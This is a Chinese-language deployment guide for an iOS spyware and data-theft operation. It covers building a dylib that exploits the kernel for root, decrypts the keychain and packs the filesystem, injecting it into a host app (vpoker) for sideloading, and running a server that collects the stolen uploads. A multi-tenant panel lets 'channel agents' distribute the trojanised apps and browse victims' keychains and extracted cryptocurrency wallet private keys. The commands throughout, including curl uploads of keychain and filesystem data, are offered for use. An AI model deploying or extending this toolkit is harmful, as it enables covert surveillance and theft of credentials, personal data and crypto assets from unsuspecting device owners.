# 部署与使用指南

## 目录

1. [架构总览](#架构总览)
2. [组件一：iOS dylib 编译与注入](#组件一ios-dylib-编译与注入)
3. [组件二：远程接收服务器部署](#组件二远程接收服务器部署)
4. [组件三：电脑端控制软件](#组件三电脑端控制软件)
5. [组件四：多租户管理后台](#组件四多租户管理后台)
6. [端到端使用流程](#端到端使用流程)
7. [常见问题](#常见问题)

---

## 架构总览

```
┌─────────────────────────────────────────────────────────────┐
│                        iOS 设备 (被注入)                      │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  宿主 App (如 vpoker)                                  │  │
│  │    └─ libappcore.dylib (WEAK 链接)                     │  │
│  │         ├─ 漏洞利用 → 内核提权 → root                   │  │
│  │         ├─ 钥匙串解密 (AKS + AES-GCM)                   │  │
│  │         ├─ 文件系统打包 (tar.gz)                        │  │
│  │         ├─ 本地 TCP 服务器 (:1337) ← 电脑端连接          │  │
│  │         └─ SimpleUploader → 远程服务器 HTTP 上传        │  │
│  └───────────────────────────────────────────────────────┘  │
└──────────────────────────┬──────────────────────────────────┘
                           │ HTTP POST /upload/<type>
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                   远程接收服务器 (Linux)                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  Flask appcore_server.py (:8080)                       │  │
│  │    ├─ /upload/keychain   钥匙串上传                     │  │
│  │    ├─ /upload/filesystem 文件系统上传                   │  │
│  │    ├─ /upload/metadata   元数据上传                     │  │
│  │    ├─ /api/*             多租户管理 API                 │  │
│  │    └─ /                  Web 管理后台 (Vue3)            │  │
│  │  SQLite: appcore.db (8张表)                             │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                           ▲
                           │ TCP :1337 (需网络可达)
┌──────────────────────────┴──────────────────────────────────┐
│                   电脑端控制软件 (Windows/Mac/Linux)           │
│  python3 appcore_controller.py --ip <设备IP> --port 1337     │
│    命令: filesystem / keychain / metadata / status / upload  │
└─────────────────────────────────────────────────────────────┘
```

---

## 组件一：iOS dylib 编译与注入

### 1.1 环境要求

| 依赖 | 版本 | 用途 |
|------|------|------|
| macOS | 12+ | 编译 iOS dylib 必须 |
| Xcode | 14.0+ | 含 iOS SDK |
| CMake | 3.15+ | 构建系统 |
| ios-cmake | latest | iOS 交叉编译工具链 |
| libarchive | 3.5+ | tar.gz 打包 |
| Python | 3.8+ | 注入脚本 |

### 1.2 编译 dylib

```bash
# 克隆项目
git clone https://github.com/AthenDrakomin-hub/libappcore-reverse.git
cd libappcore-reverse

# 安装 ios-cmake 工具链
git clone https://github.com/leetal/ios-cmake.git
export IOS_CMAKE_TOOLCHAIN=$(pwd)/ios-cmake/ios.toolchain.cmake

# 安装依赖
brew install libarchive sqlite3

# 配置并编译
mkdir build && cd build
cmake .. \
  -DCMAKE_TOOLCHAIN_FILE=$IOS_CMAKE_TOOLCHAIN \
  -DPLATFORM=OS64 \
  -DDEPLOYMENT_TARGET=14.0 \
  -DCMAKE_BUILD_TYPE=Release \
  -DLibArchive_INCLUDE_DIR=/usr/local/opt/libarchive/include \
  -DLibArchive_LIBRARY=/usr/local/opt/libarchive/lib/libarchive.dylib

make -j$(sysctl -n hw.ncpu)

# 产物: build/libappcore.dylib
```

### 1.3 验证编译产物

```bash
# 检查架构
file build/libappcore.dylib
# 期望: Mach-O 64-bit dynamically linked shared library arm64

# 检查导出符号
nm -gU build/libappcore.dylib | grep -E "libappcore_|autorun"
# 期望包含: libappcore_autorun, libappcore_do_acquisition

# 检查依赖
otool -L build/libappcore.dylib
# 期望包含: Foundation, UIKit, IOKit, libarchive, libsqlite3
```

### 1.4 注入到 IPA

使用项目附带的注入工具 `vpoker-inject-pack`：

```bash
# 注入
python3 vpoker-inject-pack/scripts/inject.py \
  --ipa original.ipa \
  --dylib build/libappcore.dylib \
  --output repacked.ipa

# 验证注入
python3 vpoker-inject-pack/scripts/inject.py --verify repacked.ipa
# 期望输出: libappcore.dylib found in Frameworks/, LC_LOAD_WEAK_DYLIB present
```

### 1.5 签名与安装

```bash
# 使用自签名证书重签名 (需 Apple Developer 账号或企业证书)
codesign --force --sign "iPhone Developer: Your Name" \
  --entitlements entitlements.plist \
  repacked.ipa/Payload/*.app

# 或使用 insert_dylib + ldid (越狱设备)
ldid -Sentitlements.plist repacked.ipa/Payload/*.app/Frameworks/libappcore.dylib

# 安装到设备
ideviceinstaller -i repacked.ipa
# 或通过 Xcode / AltStore / Sideloadly 安装
```

**entitlements.plist 必需权限：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>get-task-allow</key>
    <true/>
    <key>com.apple.private.security.no-container</key>
    <true/>
    <key>com.apple.private.security.container-required</key>
    <false/>
</dict>
</plist>
```

---

## 组件二：远程接收服务器部署

### 2.1 环境要求

| 依赖 | 版本 |
|------|------|
| Python | 3.8+ |
| pip | latest |
| 操作系统 | Linux (推荐 Ubuntu 22.04+) / macOS / Windows |

### 2.2 快速启动（开发模式）

```bash
cd libappcore-reverse/server

# 安装依赖
pip install -r requirements.txt

# 启动 (默认端口 8080)
python appcore_server.py -p 8080

# 或指定端口和数据库
python appcore_server.py -p 8080 -d /data/appcore.db
```

启动后访问：
- Web 后台: http://localhost:8080/
- 默认管理员: `admin` / `admin123`
- 默认渠道: `102` / `82008`

### 2.3 生产部署（systemd + Nginx）

**Step 1: 创建系统用户和目录**
```bash
sudo useradd -r -s /bin/false appcore
sudo mkdir -p /opt/appcore /var/lib/appcore /var/log/appcore
sudo chown -R appcore:appcore /opt/appcore /var/lib/appcore /var/log/appcore
```

**Step 2: 部署代码**
```bash
sudo cp -r libappcore-reverse/server/* /opt/appcore/
cd /opt/appcore
sudo pip install -r requirements.txt
```

**Step 3: 配置环境变量**
```bash
sudo tee /opt/appcore/.env << 'EOF'
JWT_SECRET=your-very-long-random-secret-key-change-this
PORT=8080
DB_PATH=/var/lib/appcore/appcore.db
UPLOAD_DIR=/var/lib/appcore/uploads
EOF
sudo chmod 600 /opt/appcore/.env
sudo chown appcore:appcore /opt/appcore/.env
```

**Step 4: 创建 systemd 服务**
```bash
sudo tee /etc/systemd/system/appcore.service << 'EOF'
[Unit]
Description=AppCore Remote Receiver Server
After=network.target

[Service]
Type=simple
User=appcore
Group=appcore
WorkingDirectory=/opt/appcore
EnvironmentFile=/opt/appcore/.env
ExecStart=/usr/bin/python3 appcore_server.py -p 8080 -d /var/lib/appcore/appcore.db
Restart=always
RestartSec=5
StandardOutput=append:/var/log/appcore/app.log
StandardError=append:/var/log/appcore/error.log

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now appcore
sudo systemctl status appcore
```

**Step 5: Nginx 反向代理（可选，推荐生产环境）**
```bash
sudo tee /etc/nginx/sites-available/appcore << 'EOF'
server {
    listen 80;
    server_name your-domain.com;

    client_max_body_size 500M;  # 支持大文件上传

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
    }
}
EOF

sudo ln -s /etc/nginx/sites-available/appcore /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

**Step 6: HTTPS（推荐）**
```bash
sudo certbot --nginx -d your-domain.com
```

### 2.4 服务器 API 接口

| 接口 | 方法 | 认证 | 说明 |
|------|------|------|------|
| `/upload/keychain` | POST | 否 | 钥匙串数据上传 |
| `/upload/filesystem` | POST | 否 | 文件系统 tar.gz 上传 |
| `/upload/metadata` | POST | 否 | 设备元数据上传 |
| `/api/auth/login` | POST | 否 | 管理员/渠道登录 |
| `/api/stats/overview` | GET | 是 | 总览统计 |
| `/api/devices` | GET | 是 | 设备列表 |
| `/api/devices/<id>` | GET | 是 | 设备详情 |
| `/api/files` | GET | 是 | 文件列表 |
| `/api/crack-queue` | GET | 是 | 破解队列 |
| `/api/channels` | GET | 是 | 渠道列表（仅admin） |
| `/api/users` | GET | 是 | 用户管理（仅admin） |
| `/api/audit-logs` | GET | 是 | 操作审计（仅admin） |

**上传接口示例：**
```bash
# 钥匙串上传
curl -X POST http://your-server:8080/upload/keychain \
  -H "X-Bundle-ID: org.cocos2d.demo" \
  -H "X-Device-UID: device-uid-123" \
  -H "X-iOS-Version: 15.7.3" \
  -F "file=@keychain.xml"

# 文件系统上传
curl -X POST http://your-server:8080/upload/filesystem \
  -H "X-Bundle-ID: org.cocos2d.demo" \
  -F "file=@filesystem.tar.gz"
```

---

## 组件三：电脑端控制软件

### 3.1 环境要求

- Python 3.8+
- 网络可达 iOS 设备（同一局域网或端口转发）

### 3.2 使用方法

```bash
cd libappcore-reverse/controller

# 查看帮助
python3 appcore_controller.py --help

# 连接设备
python3 appcore_controller.py --ip 192.168.1.100 --port 1337

# 连接后进入交互模式, 支持以下命令:
#   status      - 查看设备状态 (是否已提权, iOS版本)
#   version     - 查看 libappcore 版本
#   filesystem  - 拉取文件系统 (tar.gz, 保存到本地)
#   keychain    - 拉取钥匙串 (XML, 含解密数据)
#   metadata    - 拉取设备元数据 (JSON)
#   upload      - 触发远程上传 (设备主动上传到服务器)
#   exit        - 退出
```

### 3.3 非交互模式（脚本化）

```bash
# 单次拉取钥匙串
python3 appcore_controller.py --ip 192.168.1.100 --port 1337 --cmd keychain --out keychain.xml

# 单次拉取文件系统
python3 appcore_controller.py --ip 192.168.1.100 --port 1337 --cmd filesystem --out fs.tar.gz

# 查看状态
python3 appcore_controller.py --ip 192.168.1.100 --port 1337 --cmd status
```

### 3.4 通过 SSH 端口转发（设备不在同一局域网）

```bash
# 在 Mac 上通过 usbmuxd 转发
iproxy 1337 1337

# 然后连接本地
python3 appcore_controller.py --ip 127.0.0.1 --port 1337
```

---

## 组件四：多租户管理后台

### 4.1 访问

启动服务器后，浏览器访问 `http://your-server:8080/`

### 4.2 默认账号

| 角色 | 用户名 | 密码 | 权限 |
|------|--------|------|------|
| 平台管理员 | admin | admin123 | 全部数据 + 用户/渠道管理 |
| 渠道代理 | 102 | 82008 | 仅本渠道设备和数据 |

**首次登录后立即修改密码！**

### 4.3 功能模块

| 模块 | 说明 | 权限 |
|------|------|------|
| 首页总览 | 设备数/文件数/待破解数统计 | 全部 |
| iOS文件统计 | 设备uid/系统版本/钥匙包数/备忘录数/IP/时间 | 全部 |
| 渠道设备明细 | 按渠道筛选设备 | admin看全部，agent看本渠道 |
| 钥匙串管理 | 查看/下载/解密钥匙串数据 | 全部 |
| 破解队列 | 待破解文件管理 | 全部 |
| 私钥信息 | 提取的加密货币钱包私钥 | 全部 |
| 代币转账记录 | 链上转账记录 | 全部 |
| 用户管理 | 增删改管理员/渠道账号 | 仅admin |
| 渠道管理 | 增删改渠道（渠道码/名称/状态） | 仅admin |
| 操作审计 | 所有用户操作日志 | 仅admin |

### 4.4 多租户数据隔离机制

```
admin (平台管理员)
  └─ 可见全部渠道数据
  └─ 可管理用户和渠道

channel_102 (渠道代理)
  └─ 只能看到 channel_id=102 的设备
  └─ 只能下载本渠道上传的文件
  └─ 无法访问用户/渠道/审计管理

channel_82008 (子渠道)
  └─ 只能看到 channel_id=82008 的设备
  └─ 数据上传时通过 X-Channel-ID 头关联渠道
```

### 4.5 配置渠道上传

设备端 SimpleUploader 上传时添加渠道标识头：
```objc
// SimpleUploader.m 中配置
[request setValue:@"102" forHTTPHeaderField:@"X-Channel-ID"];
```

或在服务器端通过 IP 白名单自动关联渠道：
```bash
# 在服务器配置文件中添加
CHANNEL_IP_MAP="192.168.1.0/24:102,10.0.0.0/8:82008"
```

---

## 端到端使用流程

### 流程一：远程自动采集（推荐）

```
Step 1: 部署服务器
  └─ 按"组件二"部署到云服务器, 记录域名/IP

Step 2: 编译并注入 dylib
  └─ 修改 SimpleUploader.m 中的上传地址为你的服务器
  └─ 编译 dylib → 注入 IPA → 签名 → 安装到目标设备

Step 3: 设备端自动运行
  └─ 打开宿主 App → libappcore_autorun 触发
  └─ 漏洞利用 → 提权 → 采集钥匙串/文件系统
  └─ SimpleUploader 自动上传到远程服务器

Step 4: 后台查看
  └─ 浏览器访问 http://your-server:8080/
  └─ 登录 admin → iOS文件统计 → 查看设备和数据
  └─ 下载钥匙串/文件系统数据
```

### 流程二：本地手动采集（电脑端控制）

```
Step 1: 设备和电脑在同一局域网
  └─ 查看设备 WiFi IP: 设置 → WiFi → 详情

Step 2: 启动电脑端控制软件
  └─ python3 appcore_controller.py --ip <设备IP> --port 1337

Step 3: 检查状态
  └─ 输入 status → 确认 deviceExploited=YES

Step 4: 拉取数据
  └─ keychain → 保存钥匙串 XML
  └─ filesystem → 保存文件系统 tar.gz
  └─ metadata → 保存设备信息 JSON

Step 5: (可选) 触发远程上传
  └─ upload → 设备主动上传到配置的远程服务器
```

### 流程三：渠道代理模式

```
Step 1: admin 创建渠道
  └─ 登录后台 → 用户管理 → 新建渠道 (渠道码: 2001, 密码: xxx)

Step 2: 渠道商获取注入包
  └─ admin 提供已注入的 IPA (含渠道标识 X-Channel-ID: 2001)
  └─ 渠道商分发给终端用户安装

Step 3: 数据自动归集
  └─ 终端设备上传数据 → 服务器自动关联渠道 2001

Step 4: 渠道商查看
  └─ 渠道商用 2001 登录 → 只能看到自己渠道的设备
  └─ admin 登录 → 看到所有渠道汇总数据
```

---

## 常见问题

### Q1: Windows 能编译 iOS dylib 吗？
**不能。** iOS dylib 必须在 macOS + Xcode 环境编译。Windows 可以运行远程服务器和电脑端控制软件。

### Q2: 漏洞利用不生效怎么办？
1. 确认目标 iOS 版本在支持范围内（sock_port: 12-13, time_waste: 14-15.1, 等）
2. 偏移表数值需按具体 iOS 版本和设备型号验证（见 `VersionedOffsetProvider.cpp`）
3. 查看设备日志：`idevicesyslog | grep libappcore`
4. 6种框架级策略（street_race/busy_schedule等）的核心利用原语需从对应开源项目集成

### Q3: 钥匙串解密失败？
1. 需要 root 权限（漏洞利用成功后自动获取）
2. 需要正确的 entitlements（`get-task-allow` 等）
3. AKS 硬件解密需要设备已解锁（第一次解锁后）
4. 版本7/8 blob 的 NSKeyedArchiver 解析当前为简化实现，完整解析需集成 NSKeyedUnarchiver

### Q4: 上传大文件超时？
- Nginx 配置 `client_max_body_size 500M`
- Flask 配置 `MAX_CONTENT_LENGTH`
- 网络不稳定时建议用本地采集（流程二）再手动上传

### Q5: 如何修改默认密码？
```bash
# 登录后调用 API
curl -X POST http://localhost:8080/api/auth/change-password \
  -H "Authorization: Bearer <token>" \
  -d '{"old_password":"admin123","new_password":"new-pass"}'

# 或直接修改数据库
sqlite3 /var/lib/appcore/appcore.db "UPDATE users SET password_hash='<bcrypt_hash>' WHERE username='admin';"
```

### Q6: 数据存储在哪里？
- SQLite 数据库: `appcore.db`（设备/文件/用户/渠道等元数据）
- 上传文件: `uploads/` 目录（按日期/类型分目录）
- 日志: `app.log` / `error.log`

### Q7: 许可证兼容性？
- 项目主体: MIT
- cicuta_virosa 策略: GPL（集成后该文件需 GPL，建议替换为 MIT 替代方案）
- sock_port / MacDirtyCow / Fugu15 / Dopamine: MIT
- 商用前请审查各组件许可证

---

## 快速命令速查

```bash
# 编译 dylib (macOS)
cd build && cmake .. -DCMAKE_TOOLCHAIN_FILE=$IOS_CMAKE_TOOLCHAIN -DPLATFORM=OS64 && make -j8

# 注入 IPA
python3 vpoker-inject-pack/scripts/inject.py --ipa original.ipa --dylib build/libappcore.dylib --output out.ipa

# 启动服务器
cd server && pip install -r requirements.txt && python appcore_server.py -p 8080

# 电脑端控制
python3 controller/appcore_controller.py --ip 192.168.1.100 --port 1337

# 查看服务器状态
systemctl status appcore
tail -f /var/log/appcore/app.log
```
